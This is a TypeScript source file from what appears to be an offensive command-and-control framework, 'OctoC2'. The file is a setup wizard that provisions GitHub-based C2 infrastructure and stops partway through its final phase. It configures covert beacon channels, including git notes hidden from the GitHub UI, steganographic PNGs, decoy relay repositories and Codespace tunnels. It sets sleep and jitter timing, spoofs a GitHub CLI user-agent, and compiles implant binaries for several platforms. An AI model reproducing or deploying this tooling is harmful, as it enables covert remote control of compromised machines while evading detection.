// octoctl/src/commands/setup/phases.ts
import * as p from "@clack/prompts";
import { Octokit } from "@octokit/rest";
import { generateOperatorKeyPair, bytesToBase64 } from "../../lib/crypto.ts";
import { checkRepo } from "./validate.ts";
import { findProjectRoot } from "../service.ts";
import {
  ed25519KeyId,
  encodeBase64Url,
  generateEd25519KeyPair,
} from "@octoc2/shared";
import { randomBytes, randomUUID } from "node:crypto";
import { chmod, mkdir, writeFile } from "node:fs/promises";
import { dirname, resolve } from "node:path";
import {
  sectionHeader, withSpinner,
  promptPassword, promptText, promptSelect, promptConfirm, maskToken,
} from "./prompts.ts";

const DIM   = "\x1b[2m";
const BOLD  = "\x1b[1m";
const RESET = "\x1b[0m";

export interface SetupState {
  operatorGitHubToken: string;
  serverGitHubToken: string;
  owner: string;
  repo: string;
  operatorSecret: string;
  operatorPublicKey: string;
  operatorApiToken: string;
  beaconControllerToken: string;
  beaconId: string;
  appId: number;
  installationId: number;
  appPrivateKeyFile: string;
  recoveryRepoOwner: string;
  recoveryRepoName: string;
  recoveryRepoRef: string;
  recoveryWriteToken: string;
  recoverySigningSecret?: string;
  recoverySigningSecretFile?: string;
  recoverySigningPublicKey: string;
  recoverySigningKeyId: string;
  tentaclePriority?: string;
  proxyRepos?: string;
  codespaceName?: string;
  githubUser?: string;
  grpcPort?: string;
  httpUrl?: string;
  sleepSeconds?: number;
  jitter?: number;
  logLevel?: string;
  envPath?: string;
  enrollmentDir?: string;
  binaryPath?: string;
}

// ── Phase 1: Credentials ─────────────────────────────────────────────────────

export async function phaseCredentials(): Promise<{
  operatorGitHubToken: string;
  serverGitHubToken: string;
  owner: string;
  repo: string;
}> {
  sectionHeader("1/10  GitHub Credentials");

  p.note(
    `Your C2 repo is a private GitHub repository where all\n` +
    `GitHub-backed traffic flows. Credentials have separate roles:\n\n` +
    `${BOLD}Operator token${RESET} — provisioning and explicit direct-GitHub mode\n` +
    `${BOLD}Server token${RESET}   — controller polling and publishing\n\n` +
    `Neither credential is embedded in a beacon. Use distinct,\n` +
    `fine-grained tokens limited to the required repositories.`,
    "Credential boundaries"
  );

  const owner = await promptText({
    message: "Repo owner",
    placeholder: "your-username-or-org",
    validate: (v) => (!v.trim() ? "Required" : undefined),
  });

  const repo = await promptText({
    message: "Repo name",
    placeholder: "infrastructure",
    validate: (v) => (!v.trim() ? "Required" : undefined),
  });

  const operatorGitHubToken = await promptPassword({
    message: `Operator GitHub token for ${owner}/${repo}`,
    validate: (v) => {
      if (!v.trim()) return "Operator token is required";
    },
  });

  const serverGitHubToken = await promptPassword({
    message: `Server GitHub token for ${owner}/${repo}`,
    validate: (v) => {
      if (!v.trim()) return "Server token is required";
      if (v.trim() === operatorGitHubToken.trim()) {
        return "Server and operator GitHub tokens must be distinct";
      }
    },
  });

  p.log.success(`Operator token: ${maskToken(operatorGitHubToken)}`);
  p.log.success(`Server token:   ${maskToken(serverGitHubToken)}`);

  return {
    operatorGitHubToken: operatorGitHubToken.trim(),
    serverGitHubToken: serverGitHubToken.trim(),
    owner: owner.trim(),
    repo: repo.trim(),
  };
}

// ── Phase 2: Validate ────────────────────────────────────────────────────────

export async function phaseValidate(
  operatorGitHubToken: string,
  owner: string,
  repo: string,
): Promise<void> {
  sectionHeader("2/10  Validating GitHub Access");

  const result = await withSpinner(
    `Checking ${owner}/${repo}`,
    () => checkRepo(operatorGitHubToken, owner, repo),
  );

  if (result.error) {
    p.log.error(result.error);
    const retry = await promptConfirm({ message: "Re-enter credentials?", initialValue: true });
    if (retry) throw new Error("RETRY_CREDENTIALS");
    process.exit(1);
  }

  // Scope check
  if (result.scopes.length === 0) {
    p.log.info("Fine-grained token permissions are not exposed in the OAuth scope header");
  } else if (!result.scopes.includes("repo")) {
    p.log.warn("Classic token is missing the 'repo' scope");
  } else {
    p.log.success(`Scopes: ${result.scopes.join(", ")}`);
  }

  // Privacy check
  if (!result.private) {
    p.log.warn(`${owner}/${repo} is PUBLIC — strongly recommend making it private`);
    const proceed = await promptConfirm({ message: "Continue anyway?", initialValue: false });
    if (!proceed) process.exit(0);
  } else {
    p.log.success("Repo is private");
  }

  // Issues check
  if (!result.hasIssues) {
    p.log.warn("Issues are disabled — the issues tentacle won't work");
  } else {
    p.log.success("Issues enabled");
  }
}

// ── Phase 3: Keygen ──────────────────────────────────────────────────────────

export async function phaseKeygen(
  operatorGitHubToken: string,
  owner: string,
  repo: string,
): Promise<{ operatorSecret: string; operatorPublicKey: string }> {
  sectionHeader("3/10  Operator Keypair");

  p.note(
    `Generates an X25519 keypair for end-to-end encryption.\n\n` +
    `${BOLD}Secret key${RESET} — stays on your machine (written to .env)\n` +
    `${BOLD}Public key${RESET} — pushed to the C2 repo as a GitHub Variable`,
    "Encryption"
  );

  const existingSecret = process.env["OCTOC2_OPERATOR_SECRET"]?.trim();
  const existingPublic = process.env["MONITORING_PUBKEY"]?.trim();
  if (existingSecret && existingPublic) {
    const reuse = await promptConfirm({
      message: "Existing operator X25519 keypair found in env. Reuse it?",
      initialValue: true,
    });
    if (reuse) {
      p.log.success("Reusing existing keypair");
      return {
        operatorSecret: existingSecret,
        operatorPublicKey: existingPublic,
      };
    }
  } else if (existingSecret) {
    p.log.warn(
      "OCTOC2_OPERATOR_SECRET exists without MONITORING_PUBKEY; generating a complete replacement keypair",
    );
  }

  const kp = await withSpinner("Generating X25519 keypair", async () => {
    const keys = await generateOperatorKeyPair();
    return {
      secret: await bytesToBase64(keys.secretKey),
      public: await bytesToBase64(keys.publicKey),
    };
  });

  p.note(
    `Public:  ${kp.public}\n` +
    `Secret:  ${DIM}(saved to .env — never share this)${RESET}`,
    "Keypair generated"
  );

  const pushVar = await promptConfirm({
    message: `Push public key to MONITORING_PUBKEY on ${owner}/${repo}?`,
    initialValue: true,
  });

  if (pushVar) {
    await withSpinner("Setting MONITORING_PUBKEY variable", async () => {
      const octokit = new Octokit({
        auth: operatorGitHubToken,
        headers: { "user-agent": "GitHub CLI/gh/2.48.0 (linux; amd64) go/1.23.0" },
      });
      try {
        // Try update first (common case — variable already exists)
        await octokit.request("PATCH /repos/{owner}/{repo}/actions/variables/{name}", {
          owner, repo, name: "MONITORING_PUBKEY", value: kp.public,
        });
      } catch {
        // Variable doesn't exist yet — create it
        await octokit.request("POST /repos/{owner}/{repo}/actions/variables", {
          owner, repo, name: "MONITORING_PUBKEY", value: kp.public,
        });
      }
    });
  }

  return { operatorSecret: kp.secret, operatorPublicKey: kp.public };
}

// ── Phase 4: Server-held App + signed recovery ───────────────────────────────

export interface ServerRecoveryConfig {
  operatorApiToken: string;
  beaconControllerToken: string;
  beaconId: string;
  appId: number;
  installationId: number;
  appPrivateKeyFile: string;
  recoveryRepoOwner: string;
  recoveryRepoName: string;
  recoveryRepoRef: string;
  recoveryWriteToken: string;
  recoverySigningSecret: string;
  recoverySigningPublicKey: string;
  recoverySigningKeyId: string;
}

export function generateControllerCredential(): string {
  return randomBytes(32).toString("base64url");
}

export async function phaseServerRecovery(
  owner: string,
  operatorGitHubToken: string,
  serverGitHubToken: string,
): Promise<ServerRecoveryConfig> {
  sectionHeader("4/10  Server-held App & Signed Recovery");

  p.note(
    `The GitHub App private key stays on the controller. The server\n` +
    `mints short-lived, repository-bound installation-token leases\n` +
    `and publishes them as signed, sealed records at a deterministic\n` +
    `path in a dedicated public recovery repository.\n\n` +
    `The beacon receives only public recovery trust and its own\n` +
    `provisioned identity; no App key or shared GitHub token is baked.`,
    "Recovery trust boundary"
  );

  const appIdStr = await promptText({
    message: "GitHub App ID",
    placeholder: "123456",
    validate: (v) => (
      Number.isSafeInteger(Number(v)) && Number(v) > 0
        ? undefined
        : "Must be a positive integer"
    ),
  });

  const installIdStr = await promptText({
    message: "Installation ID for the C2 repository",
    placeholder: "987654",
    validate: (v) => (
      Number.isSafeInteger(Number(v)) && Number(v) > 0
        ? undefined
        : "Must be a positive integer"
    ),
  });

  const appPrivateKeyFile = await promptText({
    message: "Server-side App private key PEM path",
    placeholder: "~/.config/octoc2/github-app.pem",
    validate: (v) => (!v.trim() ? "Path is required" : undefined),
  });

  const recoveryRepoOwner = await promptText({
    message: "Public recovery repo owner",
    initialValue: owner,
    placeholder: owner,
    validate: (v) => (!v.trim() ? "Required" : undefined),
  });

  const recoveryRepoName = await promptText({
    message: "Public recovery repo name",
    placeholder: "octoc2-recovery",
    validate: (v) => (!v.trim() ? "Required" : undefined),
  });

  const recoveryRepoRef = await promptText({
    message: "Recovery repo ref",
    initialValue: "main",
    placeholder: "main",
    validate: (v) => (!v.trim() ? "Required" : undefined),
  });

  const recoveryWriteToken = await promptPassword({
    message: `Dedicated write token for ${recoveryRepoOwner}/${recoveryRepoName}`,
    validate: (v) => {
      const value = v.trim();
      if (!value) return "Recovery write token is required";
      if (value === operatorGitHubToken || value === serverGitHubToken) {
        return "Recovery writer must use a distinct credential";
      }
    },
  });

  const signing = await withSpinner(
    "Generating recovery Ed25519 signing key",
    async () => {
      const keyPair = await generateEd25519KeyPair();
      return {
        secret: encodeBase64Url(keyPair.secretKey),
        public: encodeBase64Url(keyPair.publicKey),
        keyId: await ed25519KeyId(keyPair.publicKey),
      };
    },
  );

  return {
    operatorApiToken: generateControllerCredential(),
    beaconControllerToken: generateControllerCredential(),
    beaconId: randomUUID(),
    appId: Number(appIdStr),
    installationId: Number(installIdStr),
    appPrivateKeyFile: appPrivateKeyFile.trim().replace(
      /^~/,
      process.env.HOME ?? "",
    ),
    recoveryRepoOwner: recoveryRepoOwner.trim(),
    recoveryRepoName: recoveryRepoName.trim(),
    recoveryRepoRef: recoveryRepoRef.trim(),
    recoveryWriteToken: recoveryWriteToken.trim(),
    recoverySigningSecret: signing.secret,
    recoverySigningPublicKey: signing.public,
    recoverySigningKeyId: signing.keyId,
  };
}

// ── Phase 5: Tentacle Selection ──────────────────────────────────────────────

export async function phaseTentacles(): Promise<string | undefined> {
  sectionHeader("5/10  Covert Channels");

  const mode = await promptSelect<"auto" | "custom">({
    message: "Channel selection strategy",
    options: [
      { value: "auto", label: "Recommended policy", hint: "App-compatible channels with automatic fallback" },
      { value: "custom", label: "Custom", hint: "pick channels and set priority order" },
    ],
  });

  if (mode === "auto") return undefined;

  const channels = await p.multiselect({
    message: "Select channels (top = highest priority)",
    options: [
      { value: "notes",    label: "Notes",          hint: "refs/notes — invisible to GitHub UI" },
      { value: "stego",    label: "Steganography",   hint: "LSB-encoded PNG in branches" },
      { value: "branch",   label: "Branch",          hint: "file dead-drops on infra-sync branches" },
      { value: "actions",  label: "Actions",         hint: "Variables API plus repository dispatch" },
      { value: "pages",    label: "Pages",           hint: "deployment-status transport" },
      { value: "secrets",  label: "Secrets",         hint: "Variables API — out-of-band config" },
      { value: "proxy",    label: "OctoProxy",       hint: "relay through decoy repos" },
      { value: "issues",   label: "Issues",          hint: "encrypted comments — always available" },
    ],
  });

  if (p.isCancel(channels)) {
    p.cancel("Setup cancelled.");
    process.exit(0);
  }

  return (channels as string[]).join(",");
}

// ── Phase 6: Advanced Configuration ──────────────────────────────────────────

export interface AdvancedConfig {
  proxyRepos?: string;
  codespaceName?: string;
  githubUser?: string;
  grpcPort?: string;
  httpUrl?: string;
  sleepSeconds?: number;
  jitter?: number;
  logLevel?: string;
}

export async function phaseAdvanced(
  defaultInstallationId: number,
): Promise<AdvancedConfig> {
  sectionHeader("6/10  Advanced Configuration");

  const configure = await promptConfirm({
    message: "Configure advanced options? (proxy repos, codespace gRPC, sleep tuning)",
    initialValue: false,
  });

  if (!configure) return {};

  const config: AdvancedConfig = {};

  // ── Proxy repos ──────────────────────────────────────────────────────────
  const useProxy = await promptConfirm({
    message: "Use OctoProxy relay repos?",
    initialValue: false,
  });

  if (useProxy) {
    p.note(
      `Proxy repos relay beacon traffic through decoy repositories.\n` +
      `Each entry is bound to a preconfigured GitHub App installation.\n` +
      `The server mints scoped leases; no proxy token is stored in the\n` +
      `controller environment or delivered as static beacon config.`,
      "OctoProxy"
    );

    const proxyOwner = await promptText({
      message: "Proxy repo owner",
      placeholder: "decoy-org",
      validate: (v) => (!v.trim() ? "Required" : undefined),
    });

    const proxyRepo = await promptText({
      message: "Proxy repo name",
      placeholder: "infra-sync",
      validate: (v) => (!v.trim() ? "Required" : undefined),
    });

    const proxyInstallationId = await promptText({
      message: `App installation ID for ${proxyOwner}/${proxyRepo}`,
      initialValue: String(defaultInstallationId),
      placeholder: String(defaultInstallationId),
      validate: (v) => (
        Number.isSafeInteger(Number(v)) && Number(v) > 0
          ? undefined
          : "Must be a positive integer"
      ),
    });

    const decoyIssue = await promptText({
      message: `Provisioned issue number in ${proxyOwner}/${proxyRepo}`,
      placeholder: "7",
      validate: (v) => (
        Number.isSafeInteger(Number(v)) && Number(v) > 0
          ? undefined
          : "Must be a positive integer"
      ),
    });

    config.proxyRepos = JSON.stringify([{
      owner: proxyOwner.trim(),
      repo: proxyRepo.trim(),
      installationId: Number(proxyInstallationId),
      innerKind: "issues",
      decoyIssue: Number(decoyIssue),
    }]);
    p.log.success("Proxy repo configured");
  }

  // ── Codespace gRPC ───────────────────────────────────────────────────────
  const useCodespace = await promptConfirm({
    message: "Use Codespace gRPC channel?",
    initialValue: false,
  });

  if (useCodespace) {
    p.note(
      `The gRPC channel tunnels through a GitHub Codespace via SSH.\n` +
      `The beacon connects to the Codespace and forwards gRPC traffic\n` +
      `to the C2 server running inside it.\n\n` +
      `Provide SVC_CODESPACES_GITHUB_TOKEN as a protected runtime secret on\n` +
      `the target. It must be an explicit user-scoped credential for the\n` +
      `Codespaces API/SSH gateway; App installation leases are not accepted.`,
      "Codespace gRPC"
    );

    config.codespaceName = (await promptText({
      message: "Codespace name",
      placeholder: "org-repo-abc123",
      validate: (v) => (!v.trim() ? "Required" : undefined),
    })).trim();

    config.githubUser = (await promptText({
      message: "GitHub username for SSH auth",
      placeholder: "your-username",
      validate: (v) => (!v.trim() ? "Required" : undefined),
    })).trim();

    config.grpcPort = (await promptText({
      message: "gRPC port inside Codespace",
      initialValue: "50051",
      placeholder: "50051",
    })).trim();
  }

  // Auto-derive HTTP URL from Codespace name + HTTP port (8080 default)
  if (config.codespaceName) {
    const httpPort = "8080";
    config.httpUrl = `https://${config.codespaceName}-${httpPort}.app.github.dev`;
    p.log.success(`HTTP URL: ${config.httpUrl}`);
  }

  // ── Beacon tuning ────────────────────────────────────────────────────────
  const tuneSleep = await promptConfirm({
    message: "Customize beacon sleep interval?",
    initialValue: false,
  });

  if (tuneSleep) {
    const sleepStr = await promptText({
      message: "Sleep seconds between check-ins",
      initialValue: "60",
      validate: (v) => (isNaN(parseInt(v, 10)) ? "Must be a number" : undefined),
    });
    config.sleepSeconds = parseInt(sleepStr, 10);

    const jitterStr = await promptText({
      message: "Jitter factor (0.0–1.0)",
      initialValue: "0.3",
      validate: (v) => {
        const n = parseFloat(v);
        if (isNaN(n) || n < 0 || n > 1) return "Must be 0.0–1.0";
      },
    });
    config.jitter = parseFloat(jitterStr);
  }

  // ── Controller logging ───────────────────────────────────────────────────
  const logLevel = await promptSelect<"info" | "warn" | "error" | "debug">({
    message: "Log level",
    options: [
      { value: "info", label: "Info", hint: "default" },
      { value: "warn", label: "Warn", hint: "quieter" },
      { value: "error", label: "Error", hint: "silent except errors" },
      { value: "debug", label: "Debug", hint: "verbose — for troubleshooting" },
    ],
  });
  if (logLevel !== "info") config.logLevel = logLevel;

  return config;
}

// ── Phase 7: Write .env ──────────────────────────────────────────────────────

export interface EnvFileInput {
  operatorGitHubToken: string;
  serverGitHubToken: string;
  owner: string;
  repo: string;
  operatorSecret: string;
  operatorPublicKey: string;
  operatorApiToken: string;
  beaconControllerToken: string;
  beaconId: string;
  enrollmentDir: string;
  appId: number;
  installationId: number;
  appPrivateKeyFile: string;
  recoveryRepoOwner: string;
  recoveryRepoName: string;
  recoveryRepoRef: string;
  recoveryWriteToken: string;
  recoverySigningSecretFile: string;
  recoverySigningPublicKey: string;
  recoverySigningKeyId: string;
  tentaclePriority?: string;
  proxyRepos?: string;
  grpcPort?: string;
  httpUrl?: string;
  sleepSeconds?: number;
  jitter?: number;
  logLevel?: string;
}

export interface SetupProxyPolicy {
  owner: string;
  repo: string;
  installationId: number;
  innerKind: "issues";
  decoyIssue: number;
}

const DEFAULT_RECOVERY_PRIORITY = [
  "notes",
  "stego",
  "branch",
  "actions",
  "pages",
  "secrets",
  "issues",
] as const;

const RECOVERY_CHANNELS = new Set([
  ...DEFAULT_RECOVERY_PRIORITY,
  "proxy",
  "http",
  "codespaces",
]);

export function parseSetupProxyPolicies(
  raw: string | undefined,
): SetupProxyPolicy[] {
  if (!raw) return [];
  const parsed = JSON.parse(raw) as unknown;
  if (!Array.isArray(parsed)) {
    throw new Error("Proxy policy must be a JSON array");
  }
  if (parsed.length > 1) {
    throw new Error("Proxy policy supports at most one route per beacon");
  }
  return parsed.map((entry, index) => {
    if (
      typeof entry !== "object" ||
      entry === null ||
      Array.isArray(entry)
    ) {
      throw new Error(`Proxy policy ${index} must be an object`);
    }
    const value = entry as Record<string, unknown>;
    if (
      typeof value["owner"] !== "string" ||
      typeof value["repo"] !== "string" ||
      !Number.isSafeInteger(value["installationId"]) ||
      (value["installationId"] as number) <= 0 ||
      value["innerKind"] !== "issues" ||
      !Number.isSafeInteger(value["decoyIssue"]) ||
      (value["decoyIssue"] as number) <= 0
    ) {
      throw new Error(`Proxy policy ${index} is invalid`);
    }
    return {
      owner: value["owner"],
      repo: value["repo"],
      installationId: value["installationId"] as number,
      innerKind: "issues" as const,
      decoyIssue: value["decoyIssue"] as number,
    };
  });
}

export function normalizeRecoveryTentaclePriority(
  raw: string | undefined,
  hasProxyRepos: boolean,
): string[] {
  const requested = raw
    ? raw.split(",").map((value) => value.trim()).filter(Boolean)
    : [...DEFAULT_RECOVERY_PRIORITY];
  const unsupported = requested.filter(
    (value) => !RECOVERY_CHANNELS.has(value),
  );
  if (unsupported.length > 0) {
    throw new Error(
      `Recovery policy contains unsupported channel(s): ${unsupported.join(", ")}`,
    );
  }
  const unique = [...new Set(requested)].filter(
    (value) => value !== "proxy",
  );
  if (hasProxyRepos) unique.push("proxy");
  if (unique.length === 0) {
    throw new Error("Recovery policy must contain at least one channel");
  }
  return unique;
}

export function generateEnvFile(input: EnvFileInput): string {
  const credentials = [
    input.operatorGitHubToken,
    input.serverGitHubToken,
    input.operatorApiToken,
    input.beaconControllerToken,
    input.recoveryWriteToken,
  ];
  if (new Set(credentials).size !== credentials.length) {
    throw new Error("Operator, server, recovery, and controller credentials must be distinct");
  }

  const proxyPolicies = parseSetupProxyPolicies(input.proxyRepos);
  const tentaclePriority = normalizeRecoveryTentaclePriority(
    input.tentaclePriority,
    proxyPolicies.length > 0,
  );
  const primaryPermissions = {
    metadata: "read",
    issues: "write",
    contents: "write",
    actions: "write",
    deployments: "write",
    variables: "write",
  } as const;
  const appPolicies = {
    [input.beaconId]: {
      installationId: input.installationId,
      repository: { owner: input.owner, repo: input.repo },
      permissions: primaryPermissions,
      ...(proxyPolicies.length > 0 && {
        proxyRepositories: proxyPolicies.map((proxy) => ({
          installationId: proxy.installationId,
          repository: { owner: proxy.owner, repo: proxy.repo },
          permissions: {
            metadata: "read",
            issues: "write",
            variables: "read",
          },
        })),
      }),
    },
  };
  const serverUrl = input.httpUrl ?? "https://127.0.0.1:8080";
  const recoveryPolicies = {
    [input.beaconId]: {
      serverUrl,
      controllerToken: input.beaconControllerToken,
      monitoringPublicKey: input.operatorPublicKey,
      tentaclePriority,
      relayConsortium: [],
      proxyRepos: proxyPolicies.map(({
        owner,
        repo,
        innerKind,
        decoyIssue,
      }) => ({
        owner,
        repo,
        innerKind,
        decoyIssue,
      })),
      sleepSeconds: input.sleepSeconds ?? 60,
      jitter: input.jitter ?? 0.3,
    },
  };

  const lines: string[] = [
    `# OctoC2 environment — generated by octoctl setup`,
    `# ${new Date().toISOString().slice(0, 10)}`,
    ``,
    `# Controller/operator credentials. This file is not a beacon environment.`,
    `OCTOC2_OPERATOR_GITHUB_TOKEN=${input.operatorGitHubToken}`,
    `OCTOC2_SERVER_GITHUB_TOKEN=${input.serverGitHubToken}`,
    `OCTOC2_OPERATOR_API_TOKEN=${input.operatorApiToken}`,
    `OCTOC2_BEACON_API_TOKENS='${JSON.stringify({
      [input.beaconId]: input.beaconControllerToken,
    })}'`,
    ``,
    `# C2 repository and pre-enrolled beacon identity`,
    `OCTOC2_REPO_OWNER=${input.owner}`,
    `OCTOC2_REPO_NAME=${input.repo}`,
    `OCTOC2_ENROLLMENT_DIR=${input.enrollmentDir}`,
    ``,
    `# Operator encryption identity`,
    `OCTOC2_OPERATOR_SECRET=${input.operatorSecret}`,
    `MONITORING_PUBKEY=${input.operatorPublicKey}`,
    ``,
    `# Direct listeners remain disabled and loopback-bound until explicitly enabled.`,
    `OCTOC2_SERVER_URL=${serverUrl}`,
    `OCTOC2_HTTP_ENABLED=false`,
    `OCTOC2_HTTP_HOST=127.0.0.1`,
    `OCTOC2_HTTP_PORT=8080`,
    `OCTOC2_HTTP_SERVER_CERT=`,
    `OCTOC2_HTTP_SERVER_KEY=`,
    `OCTOC2_HTTP_CA_CERT=`,
    `OCTOC2_GRPC_ENABLED=false`,
    `OCTOC2_GRPC_HOST=127.0.0.1`,
    `OCTOC2_GRPC_PORT=${input.grpcPort ?? "50051"}`,
    `OCTOC2_GRPC_CA_CERT=`,
    `OCTOC2_GRPC_SERVER_CERT=`,
    `OCTOC2_GRPC_SERVER_KEY=`,
    `OCTOC2_GRPC_CLIENT_CERT_FINGERPRINTS=`,
    ``,
    `# Server-held GitHub App and deterministic signed recovery`,
    `OCTOC2_RECOVERY_PUBLISH_ENABLED=true`,
    `OCTOC2_GITHUB_APP_ID=${input.appId}`,
    `OCTOC2_GITHUB_APP_PRIVATE_KEY_FILE=${input.appPrivateKeyFile}`,
    `OCTOC2_GITHUB_APP_POLICIES='${JSON.stringify(appPolicies)}'`,
    `OCTOC2_RECOVERY_REPO_OWNER=${input.recoveryRepoOwner}`,
    `OCTOC2_RECOVERY_REPO_NAME=${input.recoveryRepoName}`,
    `OCTOC2_RECOVERY_REPO_REF=${input.recoveryRepoRef}`,
    `OCTOC2_RECOVERY_WRITE_TOKEN=${input.recoveryWriteToken}`,
    `OCTOC2_RECOVERY_SIGNING_SECRET_FILE=${input.recoverySigningSecretFile}`,
    `OCTOC2_RECOVERY_SIGNING_PUBLIC_KEY=${input.recoverySigningPublicKey}`,
    `OCTOC2_RECOVERY_SIGNING_KEY_ID=${input.recoverySigningKeyId}`,
    `OCTOC2_RECOVERY_POLICIES='${JSON.stringify(recoveryPolicies)}'`,
    `OCTOC2_RECOVERY_PUBLISH_INTERVAL_MS=1800000`,
  ];

  if (input.logLevel) {
    lines.push(`OCTOC2_LOG_LEVEL=${input.logLevel}`);
  }

  lines.push(``);
  return lines.join("\n");
}

export async function phaseWriteEnv(state: SetupState): Promise<string> {
  sectionHeader("7/10  Environment File");

  const defaultPath =
    state.envPath ?? resolve(findProjectRoot(), ".env");

  const envPath = await promptText({
    message: "Write .env to",
    initialValue: defaultPath,
    placeholder: defaultPath,
  });

  const { existsSync } = await import("node:fs");
  if (existsSync(envPath)) {
    const overwrite = await promptConfirm({
      message: `${envPath} exists. Overwrite?`,
      initialValue: false,
    });
    if (!overwrite) {
      p.log.info("Skipped");
      return envPath;
    }
  }

  const recoverySigningSecretFile =
    state.recoverySigningSecretFile ??
    resolve(dirname(envPath), "octoc2-recovery-signing.key");
  if (
    !state.recoverySigningSecret &&
    !existsSync(recoverySigningSecretFile)
  ) {
    throw new Error(
      "Recovery signing secret is unavailable; generate or import a complete modern setup",
    );
  }
  const content = generateEnvFile({
    ...state,
    enrollmentDir: state.enrollmentDir ?? findProjectRoot(),
    recoverySigningSecretFile,
  });

  await mkdir(dirname(envPath), { recursive: true });
  await writeFile(envPath, content, "utf8");
  if (state.recoverySigningSecret) {
    await writeFile(
      recoverySigningSecretFile,
      `${state.recoverySigningSecret}\n`,
      "utf8",
    );
    try {
      await chmod(recoverySigningSecretFile, 0o600);
    } catch {
      p.log.warn(
        `Could not restrict permissions on ${recoverySigningSecretFile}; secure it manually`,
      );
    }
  }
  state.recoverySigningSecretFile = recoverySigningSecretFile;
  p.log.success(`Controller environment: ${envPath}`);
  p.log.success(`Recovery signing secret: ${recoverySigningSecretFile}`);
  return envPath;
}

// ── Phase 8: Build Beacon ────────────────────────────────────────────────────

export interface BeaconBuildResult {
  beaconId: string;
  enrollmentDir: string;
  binaryPath?: string;
}

export async function phaseBuildBeacon(
  state: SetupState,
): Promise<BeaconBuildResult> {
  sectionHeader("8/10  Build Beacon");

  const build = await promptConfirm({
    message: "Compile and pre-enroll a beacon binary now? (required)",
    initialValue: true,
  });

  if (!build) {
    throw new Error(
      "Setup requires a compiled beacon and enrollment artifact before enabling recovery publication",
    );
  }

  const target = await promptSelect<string>({
    message: "Target platform",
    options: [
      { value: "bun-linux-x64",    label: "Linux x64" },
      { value: "bun-linux-arm64",  label: "Linux ARM64" },
      { value: "bun-windows-x64",  label: "Windows x64" },
      { value: "bun-darwin-arm64", label: "macOS ARM64 (Apple Silicon)" },
      { value: "bun-darwin-x64",   label: "macOS x64 (Intel)" },
    ],
  });

  const outfile = await promptText({
    message: "Output path",
    initialValue: "./beacon",
    placeholder: "./beacon",
  });

  const args = [
    "run", "octoctl/src/index.ts", "build-beacon",
    "--outfile", outfile,
    "--target", target,
    "--beacon-id", state.beaconId,
  ];
  const priority = normalizeRecoveryTentaclePriority(
    state.tentaclePriority,
    parseSetupProxyPolicies(state.proxyRepos).length > 0,
  );
  args.push("--tentacle-priority", priority.join(","));
  if (state.codespaceName) {
    args.push("--codespace-name", state.codespaceName);
  }
  if (state.githubUser) {
    args.push("--github-user", state.githubUser);
  }
  if (state.httpUrl) {
    args.push("--http-url", state.httpUrl);
  }

  const projectRoot = findProjectRoot();
  await withSpinner("Compiling beacon", async () => {
    const bunBin = Bun.which("bun") ?? `${process.env.HOME}/.bun/bin/bun`;
    const childEnv: Record<string, string | undefined> = {
      ...process.env,
      OCTOC2_REPO_OWNER: state.owner,
      OCTOC2_REPO_NAME: state.repo,
      OCTOC2_RECOVERY_REPO_OWNER: state.recoveryRepoOwner,
      OCTOC2_RECOVERY_REPO_NAME: state.recoveryRepoName,
      OCTOC2_RECOVERY_REPO_REF: state.recoveryRepoRef,
      OCTOC2_RECOVERY_SIGNING_PUBLIC_KEY:
        state.recoverySigningPublicKey,
      OCTOC2_RECOVERY_SIGNING_KEY_ID: state.recoverySigningKeyId,
    };
    for (const secretName of [
      "OCTOC2_GITHUB_TOKEN",
      "OCTOC2_OPERATOR_GITHUB_TOKEN",
      "OCTOC2_SERVER_GITHUB_TOKEN",
      "OCTOC2_OPERATOR_API_TOKEN",
      "OCTOC2_BEACON_API_TOKENS",
      "OCTOC2_OPERATOR_SECRET",
      "OCTOC2_GITHUB_APP_PRIVATE_KEY_FILE",
      "OCTOC2_RECOVERY_WRITE_TOKEN",
      "OCTOC2_RECOVERY_SIGNING_SECRET_FILE",
      "SVC_GITHUB_TOKEN",
      "SVC_GITHUB_TOKEN_LEASE",
      "SVC_BEACON_API_TOKEN",
      "SVC_APP_PRIVATE_KEY",
      "OCTOC2_APP_PRIVATE_KEY",
    ]) {
      delete childEnv[secretName];
    }
    const proc = Bun.spawn([bunBin, ...args], {
      stdout: "pipe",
      stderr: "pipe",
      cwd: projectRoot,
      env: childEnv,
    });
    const code = await proc.exited;
    if (code !== 0) {
      const stderr = await new Response(proc.stderr).text();
      throw new Error(`Build failed (exit ${code})${stderr ? `\n${stderr.trim()}` : ""}`);
    }
    await new Response(proc.stdout).text();
  });

  const binaryPath = resolve(projectRoot, outfile);
  const enrollmentPath = `${binaryPath}.enrollment.json`;
  const details = [
    `Path: ${binaryPath}`,
    `Beacon ID: ${state.beaconId}`,
    `Enrollment: ${enrollmentPath}`,
  ];
  p.note(details.join("\n"), "Beacon compiled");
  p.log.info(
    `${DIM}The server must import the enrollment artifact before deployment.${RESET}`,
  );

  return {
    beaconId: state.beaconId,
    enrollmentDir: dirname(enrollmentPath),
    binaryPath,
  };
}

// ── Phase 9: Install to PATH ─────────────────────────────────────────────────

export async function phaseInstall(): Promise<void> {
  sectionHeader("9/10  Install CLI");

  const install = await promptConfirm({
    message: "Add octoctl to PATH? (/usr/local/bin/octoctl)",
    initialValue: true,
  });

  if (!install) {
    p.log.info(`${DIM}Run manually: bun run octoctl/src/index.ts <command>${RESET}`);
    return;
  }

  const projectRoot = findProjectRoot();
  const scriptContent = `#!/bin/sh\nexec bun "${projectRoot}/octoctl/src/index.ts" "$@"\n`;
  const targetPath = "/usr/local/bin/octoctl";

  try {
    const { writeFileSync, chmodSync } = await import("node:fs");
    writeFileSync(targetPath, scriptContent, { mode: 0o755 });
    chmodSync(targetPath, 0o755);
    p.log.success(`Installed to ${targetPath}`);
  } catch {
    p.log.warn("Permission denied — trying sudo");
    const tmpPath = `/tmp/octoctl-install-${Date.now()}`;
    const { writeFileSync } = await import("node:fs");
    writeFileSync(tmpPath, scriptContent, { mode: 0o755 });

    const proc = Bun.spawn(["sudo", "cp", tmpPath, targetPath], {
      stdout: "inherit",
      stderr: "inherit",
    });
    const code = await proc.exited;
    if (code === 0) {
      Bun.spawn(["sudo", "chmod", "+x", targetPath], { stdout: "pipe", stderr: "pipe" });
      p.log.success(`Installed to ${targetPath}`);
    } else {
      p.log.error("Install failed. Run manually:");
      p.log.info(`sudo ln -sf "${projectRoot}/octoctl/src/index.ts" ${targetPath}`);
    }

    try { (await import("node:fs")).unlinkSync(tmpPath); } catch {}
  }
}

// ── Phase 9: Done ────────────────────────────────────────────────────────────

export async function phaseVerify(state: SetupState): Promise<void> {
  sectionHeader("10/10  Ready");

